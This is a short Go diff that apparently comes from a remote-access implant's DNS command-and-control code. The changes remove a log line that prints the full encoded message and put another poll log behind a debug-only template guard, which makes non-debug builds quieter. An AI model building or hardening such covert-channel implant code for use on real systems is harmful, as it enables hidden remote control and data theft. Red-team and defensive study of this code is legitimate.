@@ -112,7 +112,6 @@ func dnsLookup(domain string) (string, error) {
 func dnsSend(parentDomain string, msgType string, sessionID string, data []byte) (string, error) {
 
 	encoded := dnsEncodeToString(data)
-	log.Printf("Full msg: %#v", encoded)
 	size := int(math.Ceil(float64(len(encoded)) / float64(dnsSendDomainStep)))
 	// {{if .Debug}}
 	log.Printf("Encoded message length is: %d (size = %d)", len(encoded), size)
@@ -331,7 +330,9 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			if txt == "0" {
 				continue
 			}
+			// {{if .Debug}}
 			log.Printf("Poll returned new block(s): %#v", txt)
+			// {{end}}
 
 			rawTxt, _ := base64.RawStdEncoding.DecodeString(txt)
 			if isReplayAttack(rawTxt) {
